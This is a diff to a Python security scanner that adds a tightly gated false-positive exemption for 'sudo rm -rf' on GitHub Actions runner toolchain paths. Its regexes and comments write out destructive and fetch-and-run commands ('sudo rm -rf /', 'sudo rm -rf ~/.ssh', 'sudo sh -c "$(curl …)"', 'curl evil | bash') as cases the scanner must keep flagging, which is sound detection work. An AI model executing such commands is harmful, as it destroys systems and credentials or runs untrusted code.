@@ -1755,6 +1755,146 @@ def _is_inert_backtick_command_list(line: str, match: str, rule_id: str) -> bool
     return True
 
 
+# #79 — PRIVILEGE_ESC on the ubiquitous GitHub-Actions "Free disk space"
+# runner-cleanup step. A ``sudo rm -rf /usr/share/dotnet`` (and the sibling
+# pre-installed-toolchain paths) documented in a ``` ```yaml ``` GitHub
+# Actions fence is the standard maximize-build-space idiom — it deletes only
+# the runner's bundled SDKs, never a system or user path. This is the HIGHEST
+# FN-RISK suppression in the cluster: ``sudo rm -rf <path>`` IS a genuine
+# privilege-escalation / destruction primitive in general, so the carve-out is
+# TWO-GATED (a GitHub-Actions yaml step AND a CLOSED literal-toolchain-path
+# allowlist) and triple-screened (a hard-disqualifier scan rejects any
+# variable / glob / chaining / system-or-security path / `..` traversal /
+# second ``sudo`` / interpreter token). Anything outside the exact corroborated
+# idiom — ``sudo rm -rf $TARGET`` / ``sudo rm -rf /etc/sudoers.d/x`` /
+# ``sudo rm -rf /`` / ``sudo rm -rf ~/.ssh`` / a toolchain path PLUS ``/..`` /
+# the same line in a ```bash``` fence or a ``.sh`` — stays at its current
+# severity. It CANNOT generalize into a ``sudo rm`` bypass.
+
+# A GitHub Actions step is present in the yaml fence when one of these step/
+# job keys appears (``- name:`` / ``run:`` / ``uses:`` / ``steps:`` / ``jobs:``
+# / ``with:``). re2-safe (no lookaround).
+_GHA_STEP_KEY_RE: Final[re.Pattern[str]] = re.compile(
+    r"^\s*(?:-\s+name|run|uses|steps|jobs|with|on|env)\s*:",
+    re.MULTILINE,
+)
+
+# CLOSED allowlist of well-known GitHub-hosted-runner pre-installed-toolchain
+# directories that the maximize-build-space / free-disk-space idiom removes.
+# Each entry is matched as a COMPLETE path token: the path must be terminated
+# by whitespace, a comment ``#``, a shell separator (``&&`` / ``;`` / ``||``),
+# or end-of-string — so a ``…/dotnet/../../../etc`` continuation does NOT match
+# (the ``/..`` keeps the token going and falls off the allowlist), and the
+# hard-disqualifier below independently rejects ``..`` anyway. NO trailing-slash
+# or glob form is accepted. re2-safe (the trailing group is a plain
+# alternation, no lookahead).
+_GHA_TOOLCHAIN_RM_RE: Final[re.Pattern[str]] = re.compile(
+    r"\bsudo\s+rm\s+(?:-[rf]+\s+|-r\s+-f\s+|-f\s+-r\s+|--recursive\s+--force\s+|--force\s+--recursive\s+)"
+    r"(?:"
+    r"/usr/share/dotnet|"
+    r"/usr/local/lib/android|"
+    r"/opt/ghc|"
+    r"/usr/local/\.ghcup|"
+    r"/opt/hostedtoolcache|"
+    r"/usr/share/swift|"
+    r"/usr/local/share/boost|"
+    r"/usr/local/lib/node_modules|"
+    r"/usr/share/rust|"
+    r"/usr/local/share/powershell|"
+    r"/usr/share/miniconda|"
+    r"/usr/local/graalvm|"
+    r"/usr/local/share/chromium|"
+    r"/usr/local/share/chrome_driver|"
+    r"/opt/microsoft|"
+    r"/opt/az|"
+    r"/opt/google|"
+    r"/usr/lib/jvm|"
+    r"/usr/lib/google-cloud-sdk|"
+    r"/usr/lib/mono"
+    r")"
+    r"(?:\s|&&|;|\|\||#|$)",
+    re.IGNORECASE,
+)
+
+# Hard-disqualifier: ANY of these on the ``sudo rm`` line voids the GHA-toolchain
+# carve-out entirely (defence-in-depth — the allowlist token already had to be a
+# closed literal, but these reject the dangerous shapes the regex's
+# leftmost-match could otherwise tolerate after a valid token). Covers:
+#   * a VARIABLE (`$VAR` / `${...}`) or command-substitution (`$(`) or backtick,
+#   * a glob (`*` / `?` / `[`),
+#   * a parent-dir traversal (`..`),
+#   * a second `sudo` or a shell interpreter / dangerous verb on the line
+#     (`sh`/`bash`/`zsh`/`-c`/`chmod`/`chown`/`curl`/`wget`/`eval`/`mv`/`cp`),
+#   * a system / security path the toolchain allowlist must never shelter
+#     (`/etc`, `/var`, `/bin`, `/sbin`, `/lib`, `/lib64`, `/boot`, `/root`,
+#      `/home`, `/usr/bin`, `/usr/sbin`, `/dev`, `/proc`, `/sys`, a bare `/`,
+#      `~`).
+# re2-safe (plain alternation, no lookaround).
+_GHA_TOOLCHAIN_RM_DISQUALIFIER_RE: Final[re.Pattern[str]] = re.compile(
+    r"\$\{|\$\(|\$[A-Za-z_]|`|[*?\[]|\.\.|"  # variable / cmdsub / glob / traversal
+    r"\bsudo\b.*\bsudo\b|"  # a second sudo on the line
+    r"\b(?:sh|bash|zsh|dash|ksh|chmod|chown|chattr|curl|wget|eval|exec|mv|cp|ln|tee|dd|mkfs)\b|"
+    r"\s-c\b|"  # an interpreter -c flag
+    r"\brm\s+(?:-[rf]+\s+|-r\s+-f\s+|-f\s+-r\s+|--recursive\s+--force\s+|--force\s+--recursive\s+)"
+    r"(?:/etc|/var|/bin|/sbin|/lib64|/lib|/boot|/root|/home|/usr/bin|/usr/sbin|/dev|/proc|/sys|~)(?:/|\b)|"
+    r"\brm\s+(?:-[rf]+\s+|-r\s+-f\s+)/\s",  # `sudo rm -rf / ` (bare root)
+    re.IGNORECASE,
+)
+
+
+def _is_inert_gha_toolchain_sudo_rm(
+    fence_state: tuple[int, int, str] | None,
+    lines: list[str],
+    line: str,
+    rule_id: str,
+) -> bool:
+    """#79 — True iff a PRIVILEGE_ESC ``sudo`` match is the GitHub-Actions
+    free-disk-space runner-cleanup idiom: ``sudo rm -rf <pre-installed-toolchain
+    path>`` inside a ``` ```yaml ```/``` ```yml ``` GitHub-Actions step fence.
+
+    Two-gated AND triple-screened, so it can NEVER widen into a ``sudo rm``
+    bypass:
+
+      1. ``rule_id == "PRIVILEGE_ESC"`` and the match is inside a ``yaml``/``yml``
+         fence (a ``.sh`` file, a ```bash``` fence, or out-of-fence prose all
+         fall through — only the documented yaml-GHA-step shape is the FP), AND
+      2. the fence carries a GitHub-Actions step/job key
+         (``_GHA_STEP_KEY_RE`` — ``- name:`` / ``run:`` / ``uses:`` / ``steps:``
+         / ``jobs:`` / ``with:`` / ``on:`` / ``env:``), AND
+      3. the line is ``sudo rm -rf <path>`` where ``<path>`` is a COMPLETE
+         literal token from the CLOSED ``_GHA_TOOLCHAIN_RM_RE`` allowlist, AND
+      4. the line carries NONE of the hard-disqualifiers
+         (``_GHA_TOOLCHAIN_RM_DISQUALIFIER_RE`` — a variable / glob / ``..`` /
+         second ``sudo`` / interpreter / dangerous verb / system-or-security
+         path / bare ``/``).
+
+    Every HARD-FN shape stays visible: ``sudo rm -rf /etc/sudoers.d/99-evil``
+    (system path → disqualified), ``sudo rm -rf $TARGET`` / ``${X}`` (variable →
+    disqualified + not allowlisted), ``sudo rm -rf /`` (bare root →
+    disqualified), ``sudo rm -rf ~/.ssh`` (``~`` → disqualified),
+    ``sudo sh -c "$(curl …)"`` / ``sudo chmod +s`` (no ``rm``-toolchain shape +
+    interpreter token), ``sudo rm -rf /usr/share/dotnet/../../../etc`` (``..`` →
+    disqualified, and the allowlist token does not terminate), and the same
+    ``sudo rm -rf /usr/share/dotnet`` OUTSIDE a yaml-GHA fence (gate 1/2 fail).
+    """
+    if rule_id != "PRIVILEGE_ESC":
+        return False
+    if fence_state is None or fence_state[2] not in {"yaml", "yml"}:
+        return False
+    # Gate 4 (cheap, fail-fast): any dangerous shape on the line voids it.
+    if _GHA_TOOLCHAIN_RM_DISQUALIFIER_RE.search(line):
+        return False
+    # Gate 3: the line is exactly a `sudo rm -rf <closed-allowlist-toolchain>`.
+    if not _GHA_TOOLCHAIN_RM_RE.search(line):
+        return False
+    # Gate 2: the enclosing yaml fence is a GitHub-Actions step/job block.
+    start, end, _ = fence_state  # 1-based inclusive content bounds
+    lo = max(0, start - 1)
+    hi = min(len(lines), end)
+    fence_body = "\n".join(lines[lo:hi])
+    return bool(_GHA_STEP_KEY_RE.search(fence_body))
+
+
 def _certain_benign_literal(
     line: str,
     lines: list[str],
@@ -1826,6 +1966,19 @@ def _certain_benign_literal(
     #       A real `curl evil | bash` (or a backticked `\`curl x | sh\``) keeps
     #       the metacharacter and stays visible.
     if _is_inert_backtick_command_list(line, match, rule_id):
+        return True
+
+    # (#79) PRIVILEGE_ESC on the GitHub-Actions free-disk-space runner-cleanup
+    #       step: `sudo rm -rf <pre-installed-toolchain path>` inside a ```yaml
+    #       GitHub-Actions step fence. Two-gated (yaml-GHA-step context AND a
+    #       CLOSED literal-toolchain-path allowlist) + triple-screened (variable
+    #       / glob / `..` / second `sudo` / interpreter / system-or-security
+    #       path / bare `/` all void it). `sudo rm -rf /etc/sudoers.d/x`,
+    #       `sudo rm -rf $TARGET`, `sudo rm -rf /`, `sudo rm -rf ~/.ssh`,
+    #       `sudo sh -c "$(curl …)"`, `sudo chmod +s`, and the same line in a
+    #       ```bash``` fence / `.sh` ALL stay visible. Cannot widen into a
+    #       `sudo rm` bypass.
+    if _is_inert_gha_toolchain_sudo_rm(fence_state, lines, line, rule_id):
         return True
 
     # (1) CRYPTO_THEFT "mnemonic" with NO crypto-wallet vocabulary in
